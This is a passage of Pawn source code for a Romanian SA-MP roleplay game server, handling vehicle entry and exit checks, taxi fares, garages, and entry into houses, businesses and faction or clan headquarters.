		if(PlayerInfo[playerid][pCarLic] < 1 && !InExamen[playerid] && !IsABike2(vehicleid) && GetVehicleModel(vehicleid) != 471) return SendErrorMsg(playerid, "Nu ai licenta de condus."), SlapPlayer(playerid);
	}
	return true;
}

redist::AttachNeon(carid) {
	if(!CarInfo[carid][cNeon]) return true;
	CarInfo[carid][cNeonObj][0] = CreateDynamicObject(CarInfo[carid][cNeonObj_][0],0,0,0,0,0,0);
	CarInfo[carid][cNeonObj][1] = CreateDynamicObject(CarInfo[carid][cNeonObj_][1],0,0,0,0,0,0);
	if(!IsABike2(CarInfo[carid][Spawned])) {
		AttachDynamicObjectToVehicle(CarInfo[carid][cNeonObj][0], CarInfo[carid][Spawned], -0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
		AttachDynamicObjectToVehicle(CarInfo[carid][cNeonObj][1], CarInfo[carid][Spawned], 0.8, 0.0, -0.70, 0.0, 0.0, 0.0);
	} else {
		AttachDynamicObjectToVehicle(CarInfo[carid][cNeonObj][0], CarInfo[carid][Spawned], -0.039999, 0.000000, -0.569999, 0.000000, 0.000000, 0.000000);
		AttachDynamicObjectToVehicle(CarInfo[carid][cNeonObj][1], CarInfo[carid][Spawned], 0.049999, 0.000000, -0.579999, 0.000000, 0.000000, 0.000000); 
	}
	return true;
}

task OneTimer[300]() {
	if(!ServerSystem[6]) foreach(new i : Rainbows<1>) ChangeRainbowColors(i);
	if(!ServerSystem[5]) foreach(new i : IsSpeed) GiveVehicleSpeed(i);
	if RulettStatus == 2 *then OnRoulettaUpdate();
	return true;
}

task TwoTimer[600]() {
	if(!ServerSystem[6]) foreach(new i : Rainbows<2>) ChangeRainbowColors(i);
	return true;
}

public OnPlayerStateChange(playerid, newstate, oldstate) {
	new vehicleid = GetPlayerVehicleID(playerid), lastcar = gLastCar[playerid], idd = FindSpawnID(vehicleid);

	switch(newstate) {
		case PLAYER_STATE_DRIVER: {
			enterVehicle[playerid] = false;
		    foreach(new i : MySpec<playerid>) PlayerSpectateVehicle(i, vehicleid);
            if(!Iter_Contains(VehOccupeid<vehicleid>, playerid)) Iter_Add(VehOccupeid<vehicleid>, playerid);
		    if(FindSpawnID(vehicleid) != -1) if(IsVehicleOccupied(CarInfo[idd][Spawned])) CarInfo[idd][cTime] = 0;
			if(IsABike(GetVehicleModel(vehicleid))) return toggleVehicleParams(vehicleid, TOGGLE_VEH_ENGINE); 
		    if(!OnDuty[playerid]) SetPlayerArmedWeapon(playerid, 0);
			
			if(CarRadio[vehicleid] != 0) {
				PlayRadio[playerid] = CarRadio[vehicleid];
				Iter_Add(RadioCount<CarRadio[vehicleid]>, playerid);
				return PlayAudioStreamForPlayer(playerid, RadioLink[CarRadio[vehicleid]]);
			}	
			
			if(PlayerInfo[playerid][pHudGen] != 0) {
				PlayerTextDrawSetString(playerid, SpeedometerPTD[0], "");
				PlayerTextDrawSetString(playerid, SpeedometerPTD[1], "");
				PlayerTextDrawSetString(playerid, SpeedometerPTD[2], "loading...");
				for(new i = 0; i < 3; i++) PlayerTextDrawShow(playerid, SpeedometerPTD[i]);
			}

			if(ServerVehicles[vehicleid][vFaction]) {
				switch(ServerVehicles[vehicleid][vFaction]) {
					case 1,2,3,14,19: if(!IsACop(playerid)) {
						SendErrorMsg(playerid, "Nu faci parte din factiunea %s.", FactionName(ServerVehicles[vehicleid][vFaction])), SlapPlayer(playerid);	
						switch(ServerVehicles[vehicleid][vRank]) {
							case 2: PlayerStage[playerid] = 1, masinaStage[playerid] = vehicleid, Iter_Add(IsSpeed, playerid);
							case 3: PlayerStage[playerid] = 2, masinaStage[playerid] = vehicleid, Iter_Add(IsSpeed, playerid);
							case 4: PlayerStage[playerid] = 4, masinaStage[playerid] = vehicleid, Iter_Add(IsSpeed, playerid);		
						}
						return true;
					}
					case 23: {
						if(ServerVehicles[vehicleid][vFaction]!=PlayerInfo[playerid][pMember]) return SendErrorMsg(playerid, "Nu faci parte din factiunea %s.", FactionName(ServerVehicles[vehicleid][vFaction])), SlapPlayer(playerid);
						if(ServerVehicles[vehicleid][vRank] > PlayerInfo[playerid][pRank]) return SendErrorMsg(playerid, "Ai nevoie de rank %d pentru a lua acest vehicul.", ServerVehicles[vehicleid][vRank]), SlapPlayer(playerid);
					}
					default: {
						if(ServerVehicles[vehicleid][vFaction]!=PlayerInfo[playerid][pMember]) return SendErrorMsg(playerid, "Nu faci parte din factiunea %s.", FactionName(ServerVehicles[vehicleid][vFaction])), SlapPlayer(playerid);	
						if(!OnDuty[playerid]&&IsACop(playerid)) return SendErrorMsg(playerid, "Nu poti folosi vehiculele factiunii daca nu esti la datorie!"), SlapPlayer(playerid);
						if(ServerVehicles[vehicleid][vRank] > PlayerInfo[playerid][pRank]) return SendErrorMsg(playerid, "Ai nevoie de rank %d pentru a lua acest vehicul.", ServerVehicles[vehicleid][vRank]), SlapPlayer(playerid);
					}
				}
			}

		    if(IsABoat(vehicleid) && InLesson[playerid] == -1 && !PlayerInfo[playerid][pBoatLic]) SendErrorMsg(playerid, "Nu ai licenta de navigatie."), SlapPlayer(playerid);
		    if(IsAPlane(GetVehicleModel(vehicleid)) && InLesson[playerid] == -1 && !PlayerInfo[playerid][pFlyLic]) SendErrorMsg(playerid, "Nu ai licenta de zbor."), SlapPlayer(playerid);
		    if(PlayerInfo[playerid][pCarLic] < 1 && !InExamen[playerid] && !IsABike2(vehicleid) && GetVehicleModel(vehicleid) != 471) SendErrorMsg(playerid, "Nu ai licenta de condus."), SlapPlayer(playerid);
	        
			if(idd != -1) {
				if(!CarInfo[idd][cClan]) {
					if(CarInfo[idd][Userid] == PlayerInfo[playerid][pSQLID]) {
						if(CarInfo[idd][cStage] > 0 || CarInfo[idd][cPremium]) Iter_Add(IsSpeed, playerid);

						sendSplittedMessageToPlayer(playerid, COLOR_WHITE, COLOR_WHITE, "This %s (ID %d) is owned by %s | Age: %d days | Odometer: %.2f km | Insurance: $%s (%d points) | Colors: %d, %d", aVehicleNames[CarInfo[idd][cModel]-400], CarInfo[idd][cID], CarInfo[idd][cOwner], CarInfo[idd][Dayss], CarInfo[idd][KM], FormatNumber(CarInfo[idd][cTax]), CarInfo[idd][cPoints], CarInfo[idd][cColorOne], CarInfo[idd][cColorTwo]);
						va_SendClientMessage(playerid, COLOR_WHITE, "Other: %s", TotalUp(idd));

						if(CarInfo[idd][cRainbows] != 0) return va_SendClientMessage(playerid, COLOR_WHITE, "Special rainbow: %s", TotalUpRainbow(idd));
						
					    if(tograinbow[playerid] > 0 && CarInfo[idd][cRainBow] && !PlayerRainbow[playerid]) {
						    masinaRainbow[playerid] = CarInfo[idd][Spawned];
						   	PlayerRainbow[playerid] = tograinbow[playerid];
						   	Iter_Add(Rainbows<tograinbow[playerid]>, playerid);
						}
						if(!CarInfo[idd][cPoints]) {
							new engine;
							SendErrorMsg(playerid, "Nu ai platit asigurarea la acest vehicul, foloseste (/v)!");
							toggleVehicleParams(vehicleid, TOGGLE_VEH_ENGINE, engine=1);				
						}
					}
					else if(CarInfo[idd][cID] != 0) {
						if(CarInfo[idd][cStage] > 0 || CarInfo[idd][cPremium]) Iter_Add(IsSpeed, playerid);
                         
						sendSplittedMessageToPlayer(playerid, COLOR_WHITE, COLOR_WHITE, "This %s (ID %d) is owned by %s | days %d | Odometer: %.0f km | Insurance: $%s (points %d) | Colors: %d, %d",aVehicleNames[CarInfo[idd][cModel]-400], CarInfo[idd][Spawned], CarInfo[idd][cOwner], CarInfo[idd][Dayss], CarInfo[idd][KM], FormatNumber(CarInfo[idd][cTax]), CarInfo[idd][cPoints], CarInfo[idd][cColorOne], CarInfo[idd][cColorTwo]); 
						va_SendClientMessage(playerid, COLOR_WHITE, "Other: %s", TotalUp(idd));

						if(CarInfo[idd][cRainbows] != -1) return va_SendClientMessage(playerid, COLOR_WHITE, "Special rainbow: %s", TotalUpRainbow(idd));
			        	if(CarInfo[idd][cRainBow]) {
							if(PlayerRainbow[playerid] == 0) {
							    masinaRainbow[playerid] = CarInfo[idd][Spawned];
							   	PlayerRainbow[playerid] = 1;
							   	Iter_Add(Rainbows<1>, playerid);
							}
						}
						if(CarInfo[idd][cPoints] == 0) {
							new engine;
							SendErrorMsg(playerid, "Acest vehicul nu are asigurarea platita!");
							toggleVehicleParams(vehicleid, TOGGLE_VEH_ENGINE, engine=1);
						}
					}			
				} 
				else {
					if(CarInfo[idd][cClan]!=PlayerInfo[playerid][pClan]) return va_SendClientMessage(playerid, -1, "This %s (ID %d) is owned by clan {%s}%s{FFFFFF} and you are not part of this clan.",GetVehicleName(CarInfo[idd][cModel]), CarInfo[idd][cID], ClanInfo[CarInfo[idd][cClan]][clColor], ClanInfo[CarInfo[idd][cClan]][clName]);
					else {
						if(CarInfo[idd][cStage]) Iter_Add(IsSpeed, playerid);
						if(PlayerInfo[playerid][pClanRank]<CarInfo[idd][cRank]) SendErrorMsg(playerid, "Ai nevoie de rank %d pentru a conduce aceasta vehicul!", CarInfo[idd][cRank]), SlapPlayer(playerid);
						va_SendClientMessage(playerid, -1, "This %s (ID %d) is owned by clan {%s}%s{FFFFFF}.",GetVehicleName(CarInfo[idd][cModel]), CarInfo[idd][cID], ClanInfo[CarInfo[idd][cClan]][clColor], ClanInfo[CarInfo[idd][cClan]][clName]);
					}
				}
			}
		    gLastDriver[vehicleid] = playerid;
			return true;
		}
		case PLAYER_STATE_PASSENGER: {
			enterVehicle[playerid]=false;
			foreach(new i : MySpec<playerid>) PlayerSpectateVehicle(i, GetPlayerVehicleID(playerid));
			if(!Iter_Contains(VehOccupeid<vehicleid>, playerid)) Iter_Add(VehOccupeid<vehicleid>, playerid);
			if(idd != -1) if(IsVehicleOccupied(CarInfo[idd][Spawned])) CarInfo[idd][cTime] = 0;
			if(!OnDuty[playerid]) SetPlayerArmedWeapon(playerid, 0);
			va_GameTextForPlayer(playerid, "~g~%s", 5000, 1, GetVehicleName(GetVehicleModel(vehicleid)));

			if(CarRadio[GetPlayerVehicleID(playerid)] != 0) {
				PlayRadio[playerid] = CarRadio[GetPlayerVehicleID(playerid)];
				Iter_Add(RadioCount<PlayRadio[playerid]>, playerid);
				PlayAudioStreamForPlayer(playerid, RadioLink[CarRadio[GetPlayerVehicleID(playerid)]]);
			}

			foreach(new i : VehOccupeid<GetPlayerVehicleID(playerid)>) {
				if(JobWorking[i] && GetPlayerState(i) == PLAYER_STATE_DRIVER && PlayerInfo[i][pJob] == 14 && JobVehicle[i] == GetPlayerVehicleID(playerid)) {
					va_SendClientMessage(i, COLOR_LIGHTBLUE, "Bus Driver: %s tocmai a urcat in autobuz si va plati cate $500 la fiecare statie.", GetName(playerid));
					va_SendClientMessage(playerid, COLOR_LIGHTBLUE, "Bus Driver: Vei plati la fiecare statie cate $500 soferului %s(%d).", GetName(i), i);
					break;
				}
	            if(GetPlayerState(i) == PLAYER_STATE_DRIVER && TaxiDuty[i]) {
					if(GetPlayerCash(playerid) < Fare[i]) {
			            SendErrorMsg(playerid, "Nu ai $%d pentru a intra in acest taxi.", Fare[i]);
	    		 		RemovePlayerFromVehicle(playerid);
	    		 		break;
					}
					Fare[playerid] = Fare[i];
					TaxiDriver[playerid] = i;
					TaxiMoney[playerid] = 0;
	                UpdateTaxiTextdraw(playerid);
					break;
				}
			}
			return true;
		}
	}
	new carid = FindSpawnID(lastcar);
	switch(oldstate) {
		case PLAYER_STATE_PASSENGER: {
			foreach(new i : MySpec<playerid>) PlayerSpectatePlayer(i, playerid);
			if(Iter_Contains(VehOccupeid<lastcar>, playerid)) Iter_Remove(VehOccupeid<lastcar>, playerid);
			if(carid != -1)  if(!IsVehicleOccupied(CarInfo[carid][Spawned])) CarInfo[carid][cTime] = 600;
			if(Helmet[playerid]) {
				Helmet[playerid] = 0;
				ProxDetector(30.0, playerid, "* %s si-a scos casca de pe cap.", COLOR_PURPLE, GetName(playerid));
				RemovePlayerAttachedObject(playerid, 3);
			}
			if(TaxiDriver[playerid] != -1) {
			    if(TaxiMoney[playerid] != 0) {
					if(TaxiMoney[playerid] >= 100) {					
						if(lastPlayerInTaxi[TaxiDriver[playerid]]!=playerid && deelayTaxi[playerid] < gettime()) {
							AddFactionRaport(TaxiDriver[playerid], 0);	
							CheckMission(playerid, 9);
							lastPlayerInTaxi[TaxiDriver[playerid]] = playerid;
							deelayTaxi[playerid] = gettime()+120;
						}
					}	
					AcceptedService[TaxiDriver[playerid]] = -1;	TaxiMoney[playerid] = 0;
					foreach(new i : StreamedPlayer[playerid]) va_SendClientMessage(i, COLOR_PURPLE, "* %s a platit taximetristului %s suma de $%s pentru cursa efectuata.", GetName(playerid), GetName(TaxiDriver[playerid]), FormatNumber(TaxiMoney[playerid]));
			    }
		        TaxiDriver[playerid] = -1;
			    PlayerTextDrawHide(playerid, FareTD);
			}
			return true;
		}
		case PLAYER_STATE_DRIVER: {
			for(new i = 0; i < 3; i++) PlayerTextDrawHide(playerid, SpeedometerPTD[i]);
			foreach(new i : MySpec<playerid>) PlayerSpectatePlayer(i, playerid);
			if(Iter_Contains(VehOccupeid<lastcar>, playerid)) Iter_Remove(VehOccupeid<lastcar>, playerid);
			if(Iter_Contains(IsSpeed, playerid)) Iter_Remove(IsSpeed, playerid);
			if(carid != -1) { if(!IsVehicleOccupied(CarInfo[carid][Spawned])) CarInfo[carid][cTime] = 600; }
		 	if(PlayerInfo[playerid][pJob] == 1 && JobWorking[playerid] && JobWorking[playerid]!=2) stopWork(playerid, 1);
			if(Iter_Contains(race_players, playerid)) return sendRaceMessage(COLOR_CLIENT, "%s has left the race arena on place %d.", GetName(playerid), player_race_pos[playerid]), destroy_race_vehicle(playerid);
			if(VehicleStats[lastcar][vColorOne]!=-1&&VehicleStats[lastcar][vColorTwo]!=-1) ChangeVehicleColor(lastcar, VehicleStats[lastcar][vColorOne], VehicleStats[lastcar][vColorTwo]);
		 	StopAudioStreamForPlayer(playerid);

			if(Helmet[playerid]) {
				Helmet[playerid] = 0;
				ProxDetector(30.0, playerid, "* %s si-a scos casca de pe cap.", COLOR_PURPLE, GetName(playerid));
				RemovePlayerAttachedObject(playerid, 3);
			}
			
			if(PlayerRainbow[playerid] != 0) {
				if(Iter_Contains(Rainbows<PlayerRainbow[playerid]>, playerid)) Iter_Remove(Rainbows<PlayerRainbow[playerid]>, playerid);
				PlayerRainbow[playerid] = false;
				masinaRainbow[playerid] = false;
			}
			if(TaxiDuty[playerid]) {
				Fare[playerid] = 0;
				TaxiDriver[playerid] = -1;
				TaxiDuty[playerid] = false;

				if(VehicleOBJ[lastcar][0]!=INVALID_OBJECT_ID&&FindSpawnID(lastcar)!=-1) 
					DestroyDynamicObject(VehicleOBJ[lastcar][0]), VehicleOBJ[lastcar][0]=INVALID_OBJECT_ID;
				
				PlayerTextDrawHide(playerid, FareTD);
				foreach(new i : VehOccupeid<lastcar>) PlayerTextDrawHide(i, FareTD), TaxiDriver[i] = -1, TaxiMoney[i] = 0;
				va_SendClientMessage(playerid, COLOR_WHITE, "Acum nu mai esti la datorie si ai primit $%s, banii facuti de tine.", FormatNumber(TaxiMoney[playerid]));
				GivePlayerCash(playerid, TaxiMoney[playerid]);
				TaxiMoney[playerid] = 0;
			}
			return true;
		}
	}		
	return true;
}

public OnPlayerExitVehicle(playerid, vehicleid) {
	new engine;	
	gLastCar[playerid] = vehicleid; LastCar[playerid] = 0;
	enterVehicle[playerid] = false; PlayRadio[playerid] = 0;
	
    DisableRemoteVehicleCollisions(playerid, 0);
	if(InExamen[playerid]) FailExamen(playerid);
	if(LastCar[playerid] == vehicleid) SpawnPlayer(playerid);
	if(TestingModel[playerid]!=0) CancelTestDrive(playerid);
	if(Iter_Contains(RadioCount<PlayRadio[playerid]>, playerid)) Iter_Remove(RadioCount<PlayRadio[playerid]>, playerid);

    if(TakingLesson[playerid] == 1) {
        TakingLesson[playerid] = 0;
	    DisablePlayerRaceCheckpointEx(playerid);
        SetVehicleToRespawn(GetPlayerVehicleID(playerid));
		SendClientMessage(playerid, COLOR_LIGHTRED, "Test esuat!");
    }
	return toggleVehicleParams(vehicleid, TOGGLE_VEH_ENGINE, engine=1);
}

public OnPlayerRequestSpawn(playerid) return !IsPlayerLogged(playerid)?0:1;
public OnPlayerRequestClass(playerid, classid) return IsPlayerLogged(playerid)?SpawnPlayer(playerid):1;

public OnEnterExitModShop(playerid, enterexit, interiorid) {
    if(enterexit) return true;
    Exception[playerid] = 2;
	if(!IsPlayerInRangeOfPoint(playerid,1,617.536071, -1.990000, 1000.657775)) return true;
	if(GetPlayerCash(playerid)<BizzInfo[(interiorid=BizzTypeID[19][0])][bFee]) return true;
	GivePlayerCash(playerid, -BizzInfo[interiorid][bFee]);
	BizzInfo[interiorid][bBalance] += BizzInfo[interiorid][bFee];
    return true;
}

redist::IsStageUpgrade(playerid, idd) {
	player_selected[playerid] = 10;
	new x = CarInfo[idd][cStage]; gString[0] = EOS;
	if(CarInfo[idd][cStage] < 3) format(gString, 256, "Your vehicle is~y~ %s~n~~w~~h~Max. speed:~y~ %d km/h~n~~w~~h~Current stage:~y~ %d/%d~w~~h~~n~Total boost: ~y~+%d km/h~w~~h~ / ~b~ %d km/h"
	,aVehicleNames[CarInfo[idd][cModel]-400], GetVehicleMaxSpeed(CarInfo[idd][cModel]), x, !CarInfo[idd][cClan] ? 4 : 3, StageSpeed[x], StageSpeed[x] + GetVehicleMaxSpeed(CarInfo[idd][cModel]));
	else format(gString, 128, "Your vehicle is~y~ %s~n~~w~~h~Max. speed:~b~ %d km/h~n~~w~~h~Current stage:~y~ %d/4~w~~h~~n~Total boost: launch control"
	,aVehicleNames[CarInfo[idd][cModel]-400], ((StageSpeed[x]) + (GetVehicleMaxSpeed(CarInfo[idd][cModel]))), x);
	PlayerTextDrawSetString(playerid, StagePTD, gString);
	for(new i = 0; i < 2; i++) TextDrawShowForPlayer(playerid, StageTD[i]);
	PlayerTextDrawShow(playerid, StagePTD);
	SelectTextDraw(playerid, 0xFFFFFFFF);
	return true;
}

stock updateTextGarage(playerid, idd) {
	format(gString, 180, "vehicle: %s~n~odometer: %.1f km~n~other - %s~n~age: %d days", GetVehicleName(CarInfo[idd][cModel]), CarInfo[idd][KM], TotalUp4(idd), CarInfo[idd][Dayss]);
	PlayerTextDrawSetString(playerid, GaragePTD, gString);
	return true;
}

stock sell_fish(playerid) {
	if(!HaveFish[playerid]) return true;
	new money = HaveFish[playerid];
	GiveJobSalary(playerid, money, 50*fishCount[playerid], fishCount[playerid], 0);
	JobInfo[PlayerInfo[playerid][pJob]][jBalance] += money;
	_query("UPDATE `jobs` SET `Balance`='%i' WHERE `ID`='%i'", JobInfo[PlayerInfo[playerid][pJob]][jBalance], PlayerInfo[playerid][pJob]);
	HaveFish[playerid]=fishCount[playerid]=CurseFacute[playerid] = 0;
	return true;
}

stock EnterFunction(playerid) {
	switch(PlayerInfo[playerid][pJob]) {
		case 6: {
			if(PlayerToPoint(3, playerid, -1684.1174,1033.9836,45.2109))
				return SetPlayerPos(playerid, -795.8011,2259.5359,59.4689);

			if JobWorking[playerid] *then {
				if PlayerToPoint(3, playerid, 2719.1731,-2517.8215,17.3672) *then
					return SetPlayerPos(playerid, 1491.3832,1361.1516,-8.6678), SetPlayerFreeze(playerid, 2);

				if(PlayerToPoint(3, playerid, 1491.3832,1361.1516,-8.6678))
					return SetPlayerPos(playerid, 2719.1731,-2517.8215,17.3672);

				if(PlayerToPoint(3, playerid, -795.8011,2259.5359,59.4689)) 
					return SetPlayerPos(playerid, -1684.1174,1033.9836,45.2109);
			}
		}
		case 9: {
			if JobWorking[playerid]==2 *then {
				if(PlayerToPoint(2.5, playerid, 2638.6838,1849.8210,11.0234)) {
					SetPlayerPos(playerid, 372.2396,-133.2700,1001.4922);
					SetPlayerInterior(playerid, 5);
					SetPlayerVirtualWorld(playerid, 69);
					SetPlayerCheckpoint(playerid, 375.9249,-113.7040,1001.4922, 1.0);
					CP[playerid] = 725;
					return true;
				}
				if(PlayerToPoint(2.5, playerid, 372.2396,-133.2700,1001.4922)) {
					SetPlayerPos(playerid, 2638.6838,1849.8210,11.0234);
					SetPlayerInterior(playerid, 0);
					SetPlayerVirtualWorld(playerid, 0);
					if(InHand[playerid]) {
						if(!JobVehicle[playerid]) {
							new const
								Float:_x[]={
									2631.1035,
									2631.3513,
									2631.6521,
									2631.4121,
									2631.3093,
									2631.3906,
								},
								Float:_y[]={
									1838.7418,
									1842.5287,
									1848.9814,
									1852.3320,
									1855.3417,
									1858.5978,
								}
							;
							new r=random(sizeof _x);
							_CreateJobVehicle(playerid,448, _x[r], _y[r], 10.4187, 90.0, 3, 3, false);
							SetPlayerCheckpoint(playerid, _x[r], _y[r], 10.4187, 2.0);
							CP[playerid] = 724;
						} else {
							new Float:x,Float:y,Float:z;
							GetVehiclePos(JobVehicle[playerid], x, y, z);
							SetPlayerCheckpoint(playerid, x,y,z, 2.0);
							CP[playerid] = 724;
						}
					}
					return true;
				}
			}
		}
	}
	new i = PickupInfo[PlayerPickup[playerid]][pkID];
	if(GarageArea[playerid]!=-1) {
		i=GarageArea[playerid];
		if(PlayerInfo[playerid][pHouse]!=GarageInfo[i][gHouses]) return true;
		if(!PlayerToPoint(2.0, playerid, GarageInfo[i][gEnterX], GarageInfo[i][gEnterY], GarageInfo[i][gEnterZ]))
			return true;

		if(!total_vehicle_in_garage[playerid]) return SendClientMessage(playerid, COLOR_LGREEN, "ERROR: You don't have vehicles spawned in the garage!");
		new x=0;
		foreach(new veh : MyVehicle<playerid>) {
			if(CarInfo[veh][cGarage]==-1||!CarInfo[veh][Spawned]) continue;
			vehicle_in_garage[playerid][x] = veh;
			x++;
		}
		inGarage[playerid] = i;
		vehicle_in_garage[playerid][x] = -1;
		for(new t=0;t<5;t++) TextDrawShowForPlayer(playerid, GarageTD[t]);
		new idd = vehicle_in_garage[playerid][0];
		updateTextGarage(playerid, idd);
		vehicle_in_garage_pos[playerid] = 0;
		PlayerTextDrawShow(playerid, GaragePTD);
		player_selected[playerid] = 15;
		Exception[playerid] = 3;
		SelectTextDraw(playerid, COLOR_LIGHTRED);
		SetPlayerVirtualWorld(playerid, CarInfo[idd][Spawned]);
		PutPlayerInVehicleEx(playerid, CarInfo[idd][Spawned], 0);
		SetPlayerCameraPos(playerid, 1370.812133, -44.325073, 1002.090270);
		SetPlayerCameraLookAt(playerid, 1373.614868, -40.229263, 1001.482727);
		return true;
	}
	switch(PickupInfo[PlayerPickup[playerid]][pkType]) {
		case 1: {
			if(!PlayerToPoint(2, playerid,HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez]))
				return true;

			if(GetPlayerVirtualWorld(playerid) != 0)
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti intra intr-o casa, pentru ca esti in alt virtual world.");

			if(HouseInfo[i][hLock] && PlayerInfo[playerid][pHouse]!=HouseInfo[i][hID]) 
				return GameTextForPlayer(playerid, "~r~~h~Inchis", 1000, 1);

			if(DeelayCommand[playerid][9]>gettime()) return DeelayTime(playerid, 9);
			DeelayCommand[playerid][9]=gettime()+10;
			SetPlayerPos(playerid,HouseInfo[i][hExitx],HouseInfo[i][hExity],HouseInfo[i][hExitz]);
			SetPlayerInterior(playerid,HouseInfo[i][hInterior]);
			SetPlayerVirtualWorld(playerid,HouseInfo[i][hVirtual]);
			InInterior[playerid]=HOUSE_INTERIOR;
			InInteriorID[playerid] = i;
			DeelayCommand[playerid][13] = gettime()+5;
			HouseRadio(playerid, i);
			return true;
		}
		case 2: {
			if(!PlayerToPoint(2, playerid,BizzInfo[i][bEntranceX], BizzInfo[i][bEntranceY], BizzInfo[i][bEntranceZ]) || BizzInfo[i][bStatic] != 0)
				return true;
			
			if(GetPlayerCash(playerid) < BizzInfo[i][bFee]) 
				return GameTextForPlayer(playerid, "~r~~h~Nu ai destui bani", 1000, 1);

			if(GetPlayerVirtualWorld(playerid)!=0&&PlayerInfo[playerid][pTutorial]>4)
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu poti intra intr-o casa, pentru ca esti in alt virtual world.");
			
			if(BizzInfo[i][bLocked] == 1) 
				return GameTextForPlayer(playerid, "~r~~h~Inchis", 1000, 1);
			
			if(DeelayCommand[playerid][9]>gettime()) return DeelayTime(playerid, 9);
			DeelayCommand[playerid][9]=gettime()+10;
			switch(BizzInfo[i][bType]) {
				case 1: SendClientMessage(playerid,COLOR_WHITE,"Welcome! The commands of this business are as follows: /withdraw, /transfer, /deposit, /balance.");
				case 3: SendClientMessage(playerid,COLOR_WHITE,"Welcome! The commands of this business are as follows: /drink.");
				case 4: SendClientMessage(playerid,COLOR_WHITE,"Welcome! The commands of this business are as follows: /buyfood, /drink.");
				case 5: SendClientMessage(playerid,COLOR_WHITE,"Welcome! The commands of this business are as follows: /buydildo,");
				case 6: {
					SendClientMessage(playerid, COLOR_WHITE, "Welcome! The commands of this business are as follows: /buy.");
					sell_fish(playerid);
				}
				case 7: SendClientMessage(playerid, COLOR_WHITE, "Welcome! The commands of this business are as follows: /clothes, /glasses, /buyhat.");
				case 8: {
					SendClientMessage(playerid,COLOR_WHITE,"Welcome! The commands of this business are as follows: /buyburger.");
					if(KG[playerid] != 0) {
						GiveJobSalary(playerid, (GetPlayerSkill(playerid)*1000*KG[playerid]) + random(1000), 120, KG[playerid]<50?1:2);
						DisablePlayerCheckpointEx(playerid);
						CP[playerid] = 0;
						KG[playerid] = 0;
						CheckMission(playerid, 3);							
					}	
				}
				case 9:  SendClientMessage(playerid,COLOR_WHITE,"Welcome! The commands of this business are as follows: /dice.");
				case 13: SendClientMessage(playerid,COLOR_WHITE,"Welcome! The commands of this business are as follows: /buyfightstyle.");
				case 19: SendClientMessage(playerid,COLOR_WHITE,"Welcome! The commands of this business are as follows: /buypizza.");
			}		   
			GivePlayerCash(playerid, -BizzInfo[i][bFee]);
			BizzInfo[i][bBalance] += BizzInfo[i][bFee];
			BizzRadio(playerid, i);							   
			SetPlayerInterior(playerid,BizzInfo[i][bInterior]);
			SetPlayerPos(playerid,BizzInfo[i][bExitX],BizzInfo[i][bExitY],BizzInfo[i][bExitZ]);
			SetPlayerVirtualWorld(playerid,BizzInfo[i][bVirtual]);
			InInterior[playerid] = BUSINESS_INTERIOR;
			InInteriorID[playerid] = i;
			gQuery[0] = EOS;
			mysql_format(SQL, gQuery, sizeof(gQuery),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[i][bBalance], BizzInfo[i][bID]);
			mysql_tquery(SQL, gQuery, "", "");
			return true;
		}
		case 3: {
			if(!PlayerToPoint(2, playerid, DynamicFactions[i][extX], DynamicFactions[i][extY], DynamicFactions[i][extZ]))
				return true;

			if(DeelayCommand[playerid][9]>gettime()) return DeelayTime(playerid, 9);
			DeelayCommand[playerid][9]=gettime()+10;
			SetPlayerPos(playerid, DynamicFactions[i][fcX], DynamicFactions[i][fcY], DynamicFactions[i][fcZ]);
			SetPlayerInterior(playerid, DynamicFactions[i][fInterior]);
			SetPlayerVirtualWorld(playerid, DynamicFactions[i][fID]);
			InInterior[playerid] = HQ_INTERIOR;
			InInteriorID[playerid] = i;
			return true;
		}
		case 4: {
			if(!PlayerToPoint(2, playerid, ClanHQInfo[i][cPosX], ClanHQInfo[i][cPosY], ClanHQInfo[i][cPosZ])) 
				return true;

			if(ClanHQInfo[i][cStatus] && PlayerInfo[playerid][pClan] != ClanHQInfo[i][cClan]) 
				return true;

			if(GetPlayerVirtualWorld(playerid) != 0)
				return true;

			if(DeelayCommand[playerid][9]>gettime()) return DeelayTime(playerid, 9);
			DeelayCommand[playerid][9]=gettime()+10;
			SetPlayerInterior(playerid, 18);
			InInterior[playerid] = CLANHQ_INTERIOR;
			InInteriorID[playerid] = i;
			SetPlayerPos(playerid, ClanHQInfo[i][cEnterX], ClanHQInfo[i][cEnterY], ClanHQInfo[i][cEnterZ]);
			SetPlayerVirtualWorld(playerid, ClanHQInfo[i][cVirtualWorld]);
			SendClientMessage(playerid, COLOR_WHITE, "Welcome your clan HQ.");	
			return true;
		}
	}		   
	return false;
}

new const Float:cameraJobPos[16][6] = {
	{-100.590789, 42.631515, 13.830297, -99.406585, 38.717937, 10.952527},
	{2431.336669, -2227.701660, 21.049888, 2427.075683, -2227.957275, 18.446449},
	{-587.209167, -1073.041137, 31.954198, -590.818176, -1070.788330, 29.327453},
	{2514.285888, 2763.020263, 21.396959, 2511.695312, 2766.376953, 18.746988},
	{2825.775146, 1965.596801, 23.551328, 2822.699218, 1968.902954, 21.404682},	
	{-780.388977, 2428.812744, 163.999130, -784.715881, 2430.728271, 162.384094},
	{829.395385, 852.515258, 18.403425, 825.246032, 854.030944, 16.061332},
	{-2048.960693, 461.735473, 39.403541, -2052.141357, 458.745697, 36.965381},
	{2623.094482, 1867.696411, 19.390447, 2625.311279, 1863.803466, 17.170005},
	{2814.144775, 954.753906, 21.784681, 2814.163085, 958.889343, 18.974378},
	{2310.815185, 570.079101, 19.630735, 2313.825195, 567.382751, 16.686275},
	{980.803771, 2149.563476, 25.380374, 978.135009, 2146.507568, 22.458057},
	{409.660980, -2080.699707, 13.394444, 406.847259, -2076.884277, 11.805305},
	{2817.817626, 1309.594848, 19.620174, 2821.988037, 1311.255859, 17.418329},
	{-2458.812255, 739.053649, 44.334980, -2461.422851, 742.804626, 42.306560},
	{-2952.479003, 453.933013, 13.501000, -2955.063720, 457.927520, 11.963806}
};

stock JobTutorial(playerid, job) {
	for(new i=0;i<20;i++) SendClientMessage(playerid, -1, "");
	SCMf(playerid, COLOR_YELLOW, "Tutorial Job %s: Informati despre job (1/2)", JobInfo[job][jName]);
	SCMf(playerid, COLOR_YELLOW, "Iti multumim %s pentru ca ai ales sa urmezi acest mic tutorial.", GetName(playerid));
